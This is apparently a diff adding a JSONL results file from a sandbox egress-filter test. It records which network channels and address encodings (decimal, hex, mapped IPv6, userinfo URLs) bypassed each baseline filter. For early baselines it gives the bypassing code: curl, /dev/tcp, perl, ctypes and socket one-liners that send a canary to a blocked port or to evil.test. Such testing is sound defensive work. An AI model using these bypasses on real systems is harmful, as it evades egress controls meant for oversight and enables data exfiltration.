@@ -1,0 +1,300 @@
+{"baseline": "B0", "bypass": true, "channel": "asyncio", "code": "import asyncio\nasync def f():\n  r,w=await asyncio.open_connection('127.1',@BAD@);w.write(b'POST /x HTTP/1.0\\r\\n\\r\\n@CAN@');await w.drain();w.close()\nasyncio.run(f())", "form": "short"}
+{"baseline": "B0", "bypass": false, "channel": "udp", "code": null, "form": "octal"}
+{"baseline": "B0", "bypass": false, "channel": "udp", "code": null, "form": "name"}
+{"baseline": "B0", "bypass": false, "channel": "udp", "code": null, "form": "ip"}
+{"baseline": "B0", "bypass": false, "channel": "udp", "code": null, "form": "decimal"}
+{"baseline": "B0", "bypass": false, "channel": "udp", "code": null, "form": "hex"}
+{"baseline": "B0", "bypass": false, "channel": "udp", "code": null, "form": "short"}
+{"baseline": "B0", "bypass": false, "channel": "udp", "code": null, "form": "mapped6"}
+{"baseline": "B0", "bypass": false, "channel": "udp", "code": null, "form": "userinfo"}
+{"baseline": "B0", "bypass": false, "channel": "udp", "code": null, "form": "trailing_dot"}
+{"baseline": "B0", "bypass": false, "channel": "udp", "code": null, "form": "upper"}
+{"baseline": "B0", "bypass": true, "channel": "py_socket", "code": "raw('127.0.0.1', @BAD@)", "form": "upper"}
+{"baseline": "B0", "bypass": true, "channel": "urllib", "code": "res=send('POST','http://EVIL.TEST:@BAD@/x','@CAN@')", "form": "upper"}
+{"baseline": "B0", "bypass": true, "channel": "py_socket", "code": "raw('127.0.0.1', @BAD@)", "form": "trailing_dot"}
+{"baseline": "B0", "bypass": false, "channel": "urllib", "code": null, "form": "trailing_dot"}
+{"baseline": "B0", "bypass": true, "channel": "urllib", "code": "res=send('POST','http://evil.test:@BAD@/x','@CAN@')", "form": "name"}
+{"baseline": "B0", "bypass": true, "channel": "urllib", "code": "res=send('POST','http://127.0.0.1:@BAD@/x','@CAN@')", "form": "ip"}
+{"baseline": "B0", "bypass": true, "channel": "http_client", "code": "import http.client\nc=http.client.HTTPConnection('127.0.0.1',@BAD@,timeout=2);c.request('POST','/x','@CAN@');c.getresponse()", "form": "trailing_dot"}
+{"baseline": "B0", "bypass": true, "channel": "asyncio", "code": "import asyncio\nasync def f():\n  r,w=await asyncio.open_connection('127.0.0.1',@BAD@);w.write(b'POST /x HTTP/1.0\\r\\n\\r\\n@CAN@');await w.drain();w.close()\nasyncio.run(f())", "form": "trailing_dot"}
+{"baseline": "B0", "bypass": true, "channel": "py_socket", "code": "raw('127.0.0.1', @BAD@)", "form": "userinfo"}
+{"baseline": "B0", "bypass": true, "channel": "urllib", "code": "res=send('POST','http://approved.test@127.0.0.1:@BAD@/x','@CAN@')", "form": "userinfo"}
+{"baseline": "B0", "bypass": true, "channel": "py_socket", "code": "raw('::ffff:127.0.0.1', @BAD@)", "form": "mapped6"}
+{"baseline": "B0", "bypass": false, "channel": "urllib", "code": null, "form": "mapped6"}
+{"baseline": "B0", "bypass": true, "channel": "urllib", "code": "res=send('POST','http://2130706433:@BAD@/x','@CAN@')", "form": "decimal"}
+{"baseline": "B0", "bypass": true, "channel": "urllib", "code": "res=send('POST','http://0x7f000001:@BAD@/x','@CAN@')", "form": "hex"}
+{"baseline": "B0", "bypass": false, "channel": "http_client", "code": null, "form": "mapped6"}
+{"baseline": "B0", "bypass": true, "channel": "http_client", "code": "import http.client\nc=http.client.HTTPConnection('127.0.0.1',@BAD@,timeout=2);c.request('POST','/x','@CAN@');c.getresponse()", "form": "name"}
+{"baseline": "B0", "bypass": true, "channel": "http_client", "code": "import http.client\nc=http.client.HTTPConnection('127.0.0.1',@BAD@,timeout=2);c.request('POST','/x','@CAN@');c.getresponse()", "form": "ip"}
+{"baseline": "B0", "bypass": false, "channel": "asyncio", "code": null, "form": "mapped6"}
+{"baseline": "B0", "bypass": true, "channel": "asyncio", "code": "import asyncio\nasync def f():\n  r,w=await asyncio.open_connection('127.0.0.1',@BAD@);w.write(b'POST /x HTTP/1.0\\r\\n\\r\\n@CAN@');await w.drain();w.close()\nasyncio.run(f())", "form": "name"}
+{"baseline": "B0", "bypass": true, "channel": "asyncio", "code": "import asyncio\nasync def f():\n  r,w=await asyncio.open_connection('127.0.0.1',@BAD@);w.write(b'POST /x HTTP/1.0\\r\\n\\r\\n@CAN@');await w.drain();w.close()\nasyncio.run(f())", "form": "ip"}
+{"baseline": "B0", "bypass": false, "channel": "curl", "code": null, "form": "mapped6"}
+{"baseline": "B0", "bypass": false, "channel": "curl", "code": null, "form": "name"}
+{"baseline": "B0", "bypass": true, "channel": "curl", "code": "import subprocess\nsubprocess.run(['curl','-s','-m','2','-d','@CAN@','http://127.0.0.1:@BAD@/x'],capture_output=True)", "form": "ip"}
+{"baseline": "B0", "bypass": true, "channel": "curl", "code": "import subprocess\nsubprocess.run(['curl','-s','-m','2','-d','@CAN@','http://2130706433:@BAD@/x'],capture_output=True)", "form": "decimal"}
+{"baseline": "B0", "bypass": true, "channel": "py_socket", "code": "raw('127.0.0.1', @BAD@)", "form": "name"}
+{"baseline": "B0", "bypass": true, "channel": "bash_devtcp", "code": "import subprocess\nsubprocess.run(['bash','-c','echo @CAN@ > /dev/tcp/127.0.0.1/@BAD@'],capture_output=True)", "form": "name"}
+{"baseline": "B0", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "mapped6"}
+{"baseline": "B0", "bypass": true, "channel": "bash_devtcp", "code": "import subprocess\nsubprocess.run(['bash','-c','echo @CAN@ > /dev/tcp/127.0.0.1/@BAD@'],capture_output=True)", "form": "ip"}
+{"baseline": "B0", "bypass": true, "channel": "bash_devtcp", "code": "import subprocess\nsubprocess.run(['bash','-c','echo @CAN@ > /dev/tcp/2130706433/@BAD@'],capture_output=True)", "form": "decimal"}
+{"baseline": "B0", "bypass": true, "channel": "perl", "code": "import subprocess\nsubprocess.run(['perl','-MIO::Socket::INET','-e','$s=IO::Socket::INET->new(PeerAddr=>\"::ffff:127.0.0.1:@BAD@\");print $s \"@CAN@\";sleep 1'],capture_output=True)", "form": "mapped6"}
+{"baseline": "B0", "bypass": false, "channel": "python_child", "code": null, "form": "mapped6"}
+{"baseline": "B0", "bypass": true, "channel": "python_child", "code": "import subprocess\nsubprocess.run(['python3','-c','import socket;s=socket.create_connection((\"127.0.0.1\",@BAD@));s.sendall(b\"@CAN@\")'],capture_output=True)", "form": "name"}
+{"baseline": "B0", "bypass": true, "channel": "python_child", "code": "import subprocess\nsubprocess.run(['python3','-c','import socket;s=socket.create_connection((\"127.0.0.1\",@BAD@));s.sendall(b\"@CAN@\")'],capture_output=True)", "form": "ip"}
+{"baseline": "B0", "bypass": false, "channel": "ctypes_syscall", "code": null, "form": "mapped6"}
+{"baseline": "B0", "bypass": true, "channel": "ctypes_syscall", "code": "import ctypes,struct\nlibc=ctypes.CDLL(None,use_errno=True);fd=libc.socket(2,1,0)\nif fd>=0:\n  a=struct.pack('<HH4s8s',2,__import__('socket').htons(@BAD@),__import__('socket').inet_aton('127.0.0.1'),b'');libc.connect(fd,a,16);libc.write(fd,b'@CAN@',22)", "form": "name"}
+{"baseline": "B0", "bypass": true, "channel": "ctypes_syscall", "code": "import ctypes,struct\nlibc=ctypes.CDLL(None,use_errno=True);fd=libc.socket(2,1,0)\nif fd>=0:\n  a=struct.pack('<HH4s8s',2,__import__('socket').htons(@BAD@),__import__('socket').inet_aton('127.0.0.1'),b'');libc.connect(fd,a,16);libc.write(fd,b'@CAN@',22)", "form": "ip"}
+{"baseline": "B0", "bypass": true, "channel": "proxy_env", "code": "os.environ['http_proxy']='http://127.0.0.1:@BAD@'\nsend('GET','http://anything.invalid/x')", "form": "mapped6"}
+{"baseline": "B0", "bypass": false, "channel": "unix_abstract", "code": null, "form": "mapped6"}
+{"baseline": "B0", "bypass": false, "channel": "unix_abstract", "code": null, "form": "name"}
+{"baseline": "B0", "bypass": false, "channel": "unix_abstract", "code": null, "form": "ip"}
+{"baseline": "B0", "bypass": false, "channel": "unix_abstract", "code": null, "form": "decimal"}
+{"baseline": "B0", "bypass": false, "channel": "unix_abstract", "code": null, "form": "hex"}
+{"baseline": "B0", "bypass": false, "channel": "unix_abstract", "code": null, "form": "octal"}
+{"baseline": "B0", "bypass": false, "channel": "unix_abstract", "code": null, "form": "short"}
+{"baseline": "B0", "bypass": false, "channel": "unix_abstract", "code": null, "form": "userinfo"}
+{"baseline": "B0", "bypass": false, "channel": "unix_abstract", "code": null, "form": "trailing_dot"}
+{"baseline": "B0", "bypass": false, "channel": "unix_abstract", "code": null, "form": "upper"}
+{"baseline": "B0", "bypass": true, "channel": "http_client", "code": "import http.client\nc=http.client.HTTPConnection('127.0.0.1',@BAD@,timeout=2);c.request('POST','/x','@CAN@');c.getresponse()", "form": "upper"}
+{"baseline": "B0", "bypass": true, "channel": "asyncio", "code": "import asyncio\nasync def f():\n  r,w=await asyncio.open_connection('127.0.0.1',@BAD@);w.write(b'POST /x HTTP/1.0\\r\\n\\r\\n@CAN@');await w.drain();w.close()\nasyncio.run(f())", "form": "upper"}
+{"baseline": "B3", "bypass": true, "channel": "asyncio", "code": "import asyncio\nasync def f():\n  r,w=await asyncio.open_connection('127.1',@BAD@);w.write(b'POST /x HTTP/1.0\\r\\n\\r\\n@CAN@');await w.drain();w.close()\nasyncio.run(f())", "form": "short"}
+{"baseline": "B3", "bypass": false, "channel": "udp", "code": null, "form": "octal"}
+{"baseline": "B3", "bypass": false, "channel": "udp", "code": null, "form": "name"}
+{"baseline": "B3", "bypass": false, "channel": "udp", "code": null, "form": "ip"}
+{"baseline": "B3", "bypass": false, "channel": "udp", "code": null, "form": "decimal"}
+{"baseline": "B3", "bypass": false, "channel": "udp", "code": null, "form": "hex"}
+{"baseline": "B3", "bypass": false, "channel": "udp", "code": null, "form": "short"}
+{"baseline": "B3", "bypass": false, "channel": "udp", "code": null, "form": "mapped6"}
+{"baseline": "B3", "bypass": false, "channel": "udp", "code": null, "form": "userinfo"}
+{"baseline": "B3", "bypass": false, "channel": "udp", "code": null, "form": "trailing_dot"}
+{"baseline": "B3", "bypass": false, "channel": "udp", "code": null, "form": "upper"}
+{"baseline": "B3", "bypass": true, "channel": "py_socket", "code": "raw('127.0.0.1', @BAD@)", "form": "upper"}
+{"baseline": "B3", "bypass": false, "channel": "urllib", "code": null, "form": "upper"}
+{"baseline": "B3", "bypass": false, "channel": "urllib", "code": null, "form": "name"}
+{"baseline": "B3", "bypass": false, "channel": "urllib", "code": null, "form": "ip"}
+{"baseline": "B3", "bypass": false, "channel": "urllib", "code": null, "form": "decimal"}
+{"baseline": "B3", "bypass": false, "channel": "urllib", "code": null, "form": "hex"}
+{"baseline": "B3", "bypass": false, "channel": "urllib", "code": null, "form": "octal"}
+{"baseline": "B3", "bypass": false, "channel": "urllib", "code": null, "form": "short"}
+{"baseline": "B3", "bypass": false, "channel": "urllib", "code": null, "form": "mapped6"}
+{"baseline": "B3", "bypass": false, "channel": "urllib", "code": null, "form": "userinfo"}
+{"baseline": "B3", "bypass": false, "channel": "urllib", "code": null, "form": "trailing_dot"}
+{"baseline": "B3", "bypass": true, "channel": "py_socket", "code": "raw('127.0.0.1', @BAD@)", "form": "trailing_dot"}
+{"baseline": "B3", "bypass": true, "channel": "http_client", "code": "import http.client\nc=http.client.HTTPConnection('127.0.0.1',@BAD@,timeout=2);c.request('POST','/x','@CAN@');c.getresponse()", "form": "trailing_dot"}
+{"baseline": "B3", "bypass": true, "channel": "py_socket", "code": "raw('127.0.0.1', @BAD@)", "form": "userinfo"}
+{"baseline": "B3", "bypass": true, "channel": "http_client", "code": "import http.client\nc=http.client.HTTPConnection('127.0.0.1',@BAD@,timeout=2);c.request('POST','/x','@CAN@');c.getresponse()", "form": "userinfo"}
+{"baseline": "B3", "bypass": true, "channel": "py_socket", "code": "raw('::ffff:127.0.0.1', @BAD@)", "form": "mapped6"}
+{"baseline": "B3", "bypass": false, "channel": "http_client", "code": null, "form": "mapped6"}
+{"baseline": "B3", "bypass": true, "channel": "http_client", "code": "import http.client\nc=http.client.HTTPConnection('127.0.0.1',@BAD@,timeout=2);c.request('POST','/x','@CAN@');c.getresponse()", "form": "name"}
+{"baseline": "B3", "bypass": true, "channel": "http_client", "code": "import http.client\nc=http.client.HTTPConnection('127.0.0.1',@BAD@,timeout=2);c.request('POST','/x','@CAN@');c.getresponse()", "form": "ip"}
+{"baseline": "B3", "bypass": false, "channel": "asyncio", "code": null, "form": "mapped6"}
+{"baseline": "B3", "bypass": true, "channel": "asyncio", "code": "import asyncio\nasync def f():\n  r,w=await asyncio.open_connection('127.0.0.1',@BAD@);w.write(b'POST /x HTTP/1.0\\r\\n\\r\\n@CAN@');await w.drain();w.close()\nasyncio.run(f())", "form": "name"}
+{"baseline": "B3", "bypass": true, "channel": "asyncio", "code": "import asyncio\nasync def f():\n  r,w=await asyncio.open_connection('127.0.0.1',@BAD@);w.write(b'POST /x HTTP/1.0\\r\\n\\r\\n@CAN@');await w.drain();w.close()\nasyncio.run(f())", "form": "ip"}
+{"baseline": "B3", "bypass": false, "channel": "curl", "code": null, "form": "mapped6"}
+{"baseline": "B3", "bypass": false, "channel": "curl", "code": null, "form": "name"}
+{"baseline": "B3", "bypass": true, "channel": "curl", "code": "import subprocess\nsubprocess.run(['curl','-s','-m','2','-d','@CAN@','http://127.0.0.1:@BAD@/x'],capture_output=True)", "form": "ip"}
+{"baseline": "B3", "bypass": true, "channel": "curl", "code": "import subprocess\nsubprocess.run(['curl','-s','-m','2','-d','@CAN@','http://2130706433:@BAD@/x'],capture_output=True)", "form": "decimal"}
+{"baseline": "B3", "bypass": true, "channel": "py_socket", "code": "raw('127.0.0.1', @BAD@)", "form": "name"}
+{"baseline": "B3", "bypass": true, "channel": "bash_devtcp", "code": "import subprocess\nsubprocess.run(['bash','-c','echo @CAN@ > /dev/tcp/127.0.0.1/@BAD@'],capture_output=True)", "form": "name"}
+{"baseline": "B3", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "mapped6"}
+{"baseline": "B3", "bypass": true, "channel": "bash_devtcp", "code": "import subprocess\nsubprocess.run(['bash','-c','echo @CAN@ > /dev/tcp/127.0.0.1/@BAD@'],capture_output=True)", "form": "ip"}
+{"baseline": "B3", "bypass": true, "channel": "bash_devtcp", "code": "import subprocess\nsubprocess.run(['bash','-c','echo @CAN@ > /dev/tcp/2130706433/@BAD@'],capture_output=True)", "form": "decimal"}
+{"baseline": "B3", "bypass": true, "channel": "perl", "code": "import subprocess\nsubprocess.run(['perl','-MIO::Socket::INET','-e','$s=IO::Socket::INET->new(PeerAddr=>\"::ffff:127.0.0.1:@BAD@\");print $s \"@CAN@\";sleep 1'],capture_output=True)", "form": "mapped6"}
+{"baseline": "B3", "bypass": false, "channel": "python_child", "code": null, "form": "mapped6"}
+{"baseline": "B3", "bypass": true, "channel": "python_child", "code": "import subprocess\nsubprocess.run(['python3','-c','import socket;s=socket.create_connection((\"127.0.0.1\",@BAD@));s.sendall(b\"@CAN@\")'],capture_output=True)", "form": "name"}
+{"baseline": "B3", "bypass": true, "channel": "python_child", "code": "import subprocess\nsubprocess.run(['python3','-c','import socket;s=socket.create_connection((\"127.0.0.1\",@BAD@));s.sendall(b\"@CAN@\")'],capture_output=True)", "form": "ip"}
+{"baseline": "B3", "bypass": false, "channel": "ctypes_syscall", "code": null, "form": "mapped6"}
+{"baseline": "B3", "bypass": true, "channel": "ctypes_syscall", "code": "import ctypes,struct\nlibc=ctypes.CDLL(None,use_errno=True);fd=libc.socket(2,1,0)\nif fd>=0:\n  a=struct.pack('<HH4s8s',2,__import__('socket').htons(@BAD@),__import__('socket').inet_aton('127.0.0.1'),b'');libc.connect(fd,a,16);libc.write(fd,b'@CAN@',22)", "form": "name"}
+{"baseline": "B3", "bypass": true, "channel": "ctypes_syscall", "code": "import ctypes,struct\nlibc=ctypes.CDLL(None,use_errno=True);fd=libc.socket(2,1,0)\nif fd>=0:\n  a=struct.pack('<HH4s8s',2,__import__('socket').htons(@BAD@),__import__('socket').inet_aton('127.0.0.1'),b'');libc.connect(fd,a,16);libc.write(fd,b'@CAN@',22)", "form": "ip"}
+{"baseline": "B3", "bypass": false, "channel": "proxy_env", "code": null, "form": "mapped6"}
+{"baseline": "B3", "bypass": false, "channel": "proxy_env", "code": null, "form": "name"}
+{"baseline": "B3", "bypass": false, "channel": "proxy_env", "code": null, "form": "ip"}
+{"baseline": "B3", "bypass": false, "channel": "proxy_env", "code": null, "form": "decimal"}
+{"baseline": "B3", "bypass": false, "channel": "proxy_env", "code": null, "form": "hex"}
+{"baseline": "B3", "bypass": false, "channel": "proxy_env", "code": null, "form": "octal"}
+{"baseline": "B3", "bypass": false, "channel": "proxy_env", "code": null, "form": "short"}
+{"baseline": "B3", "bypass": false, "channel": "proxy_env", "code": null, "form": "userinfo"}
+{"baseline": "B3", "bypass": false, "channel": "proxy_env", "code": null, "form": "trailing_dot"}
+{"baseline": "B3", "bypass": false, "channel": "proxy_env", "code": null, "form": "upper"}
+{"baseline": "B3", "bypass": true, "channel": "http_client", "code": "import http.client\nc=http.client.HTTPConnection('127.0.0.1',@BAD@,timeout=2);c.request('POST','/x','@CAN@');c.getresponse()", "form": "upper"}
+{"baseline": "B4", "bypass": false, "channel": "asyncio", "code": null, "form": "short"}
+{"baseline": "B4", "bypass": false, "channel": "asyncio", "code": null, "form": "name"}
+{"baseline": "B4", "bypass": false, "channel": "asyncio", "code": null, "form": "ip"}
+{"baseline": "B4", "bypass": false, "channel": "asyncio", "code": null, "form": "decimal"}
+{"baseline": "B4", "bypass": false, "channel": "asyncio", "code": null, "form": "hex"}
+{"baseline": "B4", "bypass": false, "channel": "asyncio", "code": null, "form": "octal"}
+{"baseline": "B4", "bypass": false, "channel": "asyncio", "code": null, "form": "mapped6"}
+{"baseline": "B4", "bypass": false, "channel": "asyncio", "code": null, "form": "userinfo"}
+{"baseline": "B4", "bypass": false, "channel": "asyncio", "code": null, "form": "trailing_dot"}
+{"baseline": "B4", "bypass": false, "channel": "asyncio", "code": null, "form": "upper"}
+{"baseline": "B4", "bypass": false, "channel": "py_socket", "code": null, "form": "upper"}
+{"baseline": "B4", "bypass": false, "channel": "py_socket", "code": null, "form": "name"}
+{"baseline": "B4", "bypass": false, "channel": "py_socket", "code": null, "form": "ip"}
+{"baseline": "B4", "bypass": false, "channel": "py_socket", "code": null, "form": "decimal"}
+{"baseline": "B4", "bypass": false, "channel": "py_socket", "code": null, "form": "hex"}
+{"baseline": "B4", "bypass": false, "channel": "py_socket", "code": null, "form": "octal"}
+{"baseline": "B4", "bypass": false, "channel": "py_socket", "code": null, "form": "short"}
+{"baseline": "B4", "bypass": false, "channel": "py_socket", "code": null, "form": "mapped6"}
+{"baseline": "B4", "bypass": false, "channel": "py_socket", "code": null, "form": "userinfo"}
+{"baseline": "B4", "bypass": false, "channel": "py_socket", "code": null, "form": "trailing_dot"}
+{"baseline": "B4", "bypass": false, "channel": "urllib", "code": null, "form": "trailing_dot"}
+{"baseline": "B4", "bypass": false, "channel": "urllib", "code": null, "form": "name"}
+{"baseline": "B4", "bypass": false, "channel": "urllib", "code": null, "form": "ip"}
+{"baseline": "B4", "bypass": false, "channel": "urllib", "code": null, "form": "decimal"}
+{"baseline": "B4", "bypass": false, "channel": "urllib", "code": null, "form": "hex"}
+{"baseline": "B4", "bypass": false, "channel": "urllib", "code": null, "form": "octal"}
+{"baseline": "B4", "bypass": false, "channel": "urllib", "code": null, "form": "short"}
+{"baseline": "B4", "bypass": false, "channel": "urllib", "code": null, "form": "mapped6"}
+{"baseline": "B4", "bypass": false, "channel": "urllib", "code": null, "form": "userinfo"}
+{"baseline": "B4", "bypass": false, "channel": "urllib", "code": null, "form": "upper"}
+{"baseline": "B4", "bypass": false, "channel": "http_client", "code": null, "form": "upper"}
+{"baseline": "B4", "bypass": false, "channel": "http_client", "code": null, "form": "name"}
+{"baseline": "B4", "bypass": false, "channel": "http_client", "code": null, "form": "ip"}
+{"baseline": "B4", "bypass": false, "channel": "http_client", "code": null, "form": "decimal"}
+{"baseline": "B4", "bypass": false, "channel": "http_client", "code": null, "form": "hex"}
+{"baseline": "B4", "bypass": false, "channel": "http_client", "code": null, "form": "octal"}
+{"baseline": "B4", "bypass": false, "channel": "http_client", "code": null, "form": "short"}
+{"baseline": "B4", "bypass": false, "channel": "http_client", "code": null, "form": "mapped6"}
+{"baseline": "B4", "bypass": false, "channel": "http_client", "code": null, "form": "userinfo"}
+{"baseline": "B4", "bypass": false, "channel": "http_client", "code": null, "form": "trailing_dot"}
+{"baseline": "B4", "bypass": false, "channel": "curl", "code": null, "form": "trailing_dot"}
+{"baseline": "B4", "bypass": false, "channel": "curl", "code": null, "form": "name"}
+{"baseline": "B4", "bypass": false, "channel": "curl", "code": null, "form": "ip"}
+{"baseline": "B4", "bypass": false, "channel": "curl", "code": null, "form": "decimal"}
+{"baseline": "B4", "bypass": false, "channel": "curl", "code": null, "form": "hex"}
+{"baseline": "B4", "bypass": false, "channel": "curl", "code": null, "form": "octal"}
+{"baseline": "B4", "bypass": false, "channel": "curl", "code": null, "form": "short"}
+{"baseline": "B4", "bypass": false, "channel": "curl", "code": null, "form": "mapped6"}
+{"baseline": "B4", "bypass": false, "channel": "curl", "code": null, "form": "userinfo"}
+{"baseline": "B4", "bypass": false, "channel": "curl", "code": null, "form": "upper"}
+{"baseline": "B4", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "upper"}
+{"baseline": "B4", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "name"}
+{"baseline": "B4", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "ip"}
+{"baseline": "B4", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "decimal"}
+{"baseline": "B4", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "hex"}
+{"baseline": "B4", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "octal"}
+{"baseline": "B4", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "short"}
+{"baseline": "B4", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "mapped6"}
+{"baseline": "B4", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "userinfo"}
+{"baseline": "B4", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "trailing_dot"}
+{"baseline": "B5", "bypass": false, "channel": "asyncio", "code": null, "form": "short"}
+{"baseline": "B5", "bypass": false, "channel": "asyncio", "code": null, "form": "name"}
+{"baseline": "B5", "bypass": false, "channel": "asyncio", "code": null, "form": "ip"}
+{"baseline": "B5", "bypass": false, "channel": "asyncio", "code": null, "form": "decimal"}
+{"baseline": "B5", "bypass": false, "channel": "asyncio", "code": null, "form": "hex"}
+{"baseline": "B5", "bypass": false, "channel": "asyncio", "code": null, "form": "octal"}
+{"baseline": "B5", "bypass": false, "channel": "asyncio", "code": null, "form": "mapped6"}
+{"baseline": "B5", "bypass": false, "channel": "asyncio", "code": null, "form": "userinfo"}
+{"baseline": "B5", "bypass": false, "channel": "asyncio", "code": null, "form": "trailing_dot"}
+{"baseline": "B5", "bypass": false, "channel": "asyncio", "code": null, "form": "upper"}
+{"baseline": "B5", "bypass": false, "channel": "py_socket", "code": null, "form": "upper"}
+{"baseline": "B5", "bypass": false, "channel": "py_socket", "code": null, "form": "name"}
+{"baseline": "B5", "bypass": false, "channel": "py_socket", "code": null, "form": "ip"}
+{"baseline": "B5", "bypass": false, "channel": "py_socket", "code": null, "form": "decimal"}
+{"baseline": "B5", "bypass": false, "channel": "py_socket", "code": null, "form": "hex"}
+{"baseline": "B5", "bypass": false, "channel": "py_socket", "code": null, "form": "octal"}
+{"baseline": "B5", "bypass": false, "channel": "py_socket", "code": null, "form": "short"}
+{"baseline": "B5", "bypass": false, "channel": "py_socket", "code": null, "form": "mapped6"}
+{"baseline": "B5", "bypass": false, "channel": "py_socket", "code": null, "form": "userinfo"}
+{"baseline": "B5", "bypass": false, "channel": "py_socket", "code": null, "form": "trailing_dot"}
+{"baseline": "B5", "bypass": false, "channel": "urllib", "code": null, "form": "trailing_dot"}
+{"baseline": "B5", "bypass": false, "channel": "urllib", "code": null, "form": "name"}
+{"baseline": "B5", "bypass": false, "channel": "urllib", "code": null, "form": "ip"}
+{"baseline": "B5", "bypass": false, "channel": "urllib", "code": null, "form": "decimal"}
+{"baseline": "B5", "bypass": false, "channel": "urllib", "code": null, "form": "hex"}
+{"baseline": "B5", "bypass": false, "channel": "urllib", "code": null, "form": "octal"}
+{"baseline": "B5", "bypass": false, "channel": "urllib", "code": null, "form": "short"}
+{"baseline": "B5", "bypass": false, "channel": "urllib", "code": null, "form": "mapped6"}
+{"baseline": "B5", "bypass": false, "channel": "urllib", "code": null, "form": "userinfo"}
+{"baseline": "B5", "bypass": false, "channel": "urllib", "code": null, "form": "upper"}
+{"baseline": "B5", "bypass": false, "channel": "http_client", "code": null, "form": "upper"}
+{"baseline": "B5", "bypass": false, "channel": "http_client", "code": null, "form": "name"}
+{"baseline": "B5", "bypass": false, "channel": "http_client", "code": null, "form": "ip"}
+{"baseline": "B5", "bypass": false, "channel": "http_client", "code": null, "form": "decimal"}
+{"baseline": "B5", "bypass": false, "channel": "http_client", "code": null, "form": "hex"}
+{"baseline": "B5", "bypass": false, "channel": "http_client", "code": null, "form": "octal"}
+{"baseline": "B5", "bypass": false, "channel": "http_client", "code": null, "form": "short"}
+{"baseline": "B5", "bypass": false, "channel": "http_client", "code": null, "form": "mapped6"}
+{"baseline": "B5", "bypass": false, "channel": "http_client", "code": null, "form": "userinfo"}
+{"baseline": "B5", "bypass": false, "channel": "http_client", "code": null, "form": "trailing_dot"}
+{"baseline": "B5", "bypass": false, "channel": "curl", "code": null, "form": "trailing_dot"}
+{"baseline": "B5", "bypass": false, "channel": "curl", "code": null, "form": "name"}
+{"baseline": "B5", "bypass": false, "channel": "curl", "code": null, "form": "ip"}
+{"baseline": "B5", "bypass": false, "channel": "curl", "code": null, "form": "decimal"}
+{"baseline": "B5", "bypass": false, "channel": "curl", "code": null, "form": "hex"}
+{"baseline": "B5", "bypass": false, "channel": "curl", "code": null, "form": "octal"}
+{"baseline": "B5", "bypass": false, "channel": "curl", "code": null, "form": "short"}
+{"baseline": "B5", "bypass": false, "channel": "curl", "code": null, "form": "mapped6"}
+{"baseline": "B5", "bypass": false, "channel": "curl", "code": null, "form": "userinfo"}
+{"baseline": "B5", "bypass": false, "channel": "curl", "code": null, "form": "upper"}
+{"baseline": "B5", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "upper"}
+{"baseline": "B5", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "name"}
+{"baseline": "B5", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "ip"}
+{"baseline": "B5", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "decimal"}
+{"baseline": "B5", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "hex"}
+{"baseline": "B5", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "octal"}
+{"baseline": "B5", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "short"}
+{"baseline": "B5", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "mapped6"}
+{"baseline": "B5", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "userinfo"}
+{"baseline": "B5", "bypass": false, "channel": "bash_devtcp", "code": null, "form": "trailing_dot"}
+{"baseline": "B6", "bypass": false, "channel": "asyncio", "code": null, "form": "short"}
+{"baseline": "B6", "bypass": false, "channel": "asyncio", "code": null, "form": "name"}
+{"baseline": "B6", "bypass": false, "channel": "asyncio", "code": null, "form": "ip"}
+{"baseline": "B6", "bypass": false, "channel": "asyncio", "code": null, "form": "decimal"}
+{"baseline": "B6", "bypass": false, "channel": "asyncio", "code": null, "form": "hex"}
+{"baseline": "B6", "bypass": false, "channel": "asyncio", "code": null, "form": "octal"}
+{"baseline": "B6", "bypass": false, "channel": "asyncio", "code": null, "form": "mapped6"}
+{"baseline": "B6", "bypass": false, "channel": "asyncio", "code": null, "form": "userinfo"}
+{"baseline": "B6", "bypass": false, "channel": "asyncio", "code": null, "form": "trailing_dot"}
+{"baseline": "B6", "bypass": false, "channel": "asyncio", "code": null, "form": "upper"}
+{"baseline": "B6", "bypass": false, "channel": "py_socket", "code": null, "form": "upper"}
+{"baseline": "B6", "bypass": false, "channel": "py_socket", "code": null, "form": "name"}
+{"baseline": "B6", "bypass": false, "channel": "py_socket", "code": null, "form": "ip"}
+{"baseline": "B6", "bypass": false, "channel": "py_socket", "code": null, "form": "decimal"}
+{"baseline": "B6", "bypass": false, "channel": "py_socket", "code": null, "form": "hex"}
+{"baseline": "B6", "bypass": false, "channel": "py_socket", "code": null, "form": "octal"}
+{"baseline": "B6", "bypass": false, "channel": "py_socket", "code": null, "form": "short"}
+{"baseline": "B6", "bypass": false, "channel": "py_socket", "code": null, "form": "mapped6"}
+{"baseline": "B6", "bypass": false, "channel": "py_socket", "code": null, "form": "userinfo"}
+{"baseline": "B6", "bypass": false, "channel": "py_socket", "code": null, "form": "trailing_dot"}
+{"baseline": "B6", "bypass": false, "channel": "urllib", "code": null, "form": "trailing_dot"}
+{"baseline": "B6", "bypass": false, "channel": "urllib", "code": null, "form": "name"}
+{"baseline": "B6", "bypass": false, "channel": "urllib", "code": null, "form": "ip"}
+{"baseline": "B6", "bypass": false, "channel": "urllib", "code": null, "form": "decimal"}
+{"baseline": "B6", "bypass": false, "channel": "urllib", "code": null, "form": "hex"}
+{"baseline": "B6", "bypass": false, "channel": "urllib", "code": null, "form": "octal"}
+{"baseline": "B6", "bypass": false, "channel": "urllib", "code": null, "form": "short"}
+{"baseline": "B6", "bypass": false, "channel": "urllib", "code": null, "form": "mapped6"}
+{"baseline": "B6", "bypass": false, "channel": "urllib", "code": null, "form": "userinfo"}
